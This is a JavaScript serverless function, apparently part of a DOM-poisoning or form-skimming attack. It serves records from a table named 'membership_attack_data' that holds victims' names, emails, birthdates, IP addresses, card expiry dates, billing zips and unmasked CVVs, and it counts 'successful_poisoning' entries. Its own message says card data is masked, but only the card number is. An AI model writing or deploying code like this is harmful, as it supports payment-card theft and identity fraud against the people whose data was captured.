// Vercel Serverless Function to view captured membership attack data
// Endpoint: /api/membership/view

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        // Get query parameters for filtering
        const { limit = 50, dom_success_only } = req.query;

        let result;
        if (dom_success_only === 'true') {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    CASE
                        WHEN verify_card_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verify_card_number, 4))
                        ELSE NULL
                    END as masked_card_number,
                    verify_expiry_month,
                    verify_expiry_year,
                    verify_cvv,
                    verify_card_name,
                    verify_billing_zip,
                    dom_poisoning_success,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data
                WHERE dom_poisoning_success = true
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        } else {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    CASE
                        WHEN verify_card_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verify_card_number, 4))
                        ELSE NULL
                    END as masked_card_number,
                    verify_expiry_month,
                    verify_expiry_year,
                    verify_cvv,
                    verify_card_name,
                    verify_billing_zip,
                    dom_poisoning_success,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        }

        // Calculate statistics
        const stats = {
            total_records: result.length,
            successful_poisoning: result.filter(r => r.dom_poisoning_success).length,
            with_payment_data: result.filter(r => r.masked_card_number).length,
            field_updates: result.filter(r => r.is_field_update).length,
            final_submissions: result.filter(r => !r.is_field_update).length
        };

        res.status(200).json({
            success: true,
            message: 'Membership attack data retrieved',
            statistics: stats,
            data: result,
            table: 'membership_attack_data',
            note: 'Card numbers are masked for security'
        });

    } catch (error) {
        console.error('Failed to retrieve membership data:', error);
        res.status(500).json({
            error: 'Failed to retrieve membership attack data',
            details: error.message
        });
    }
}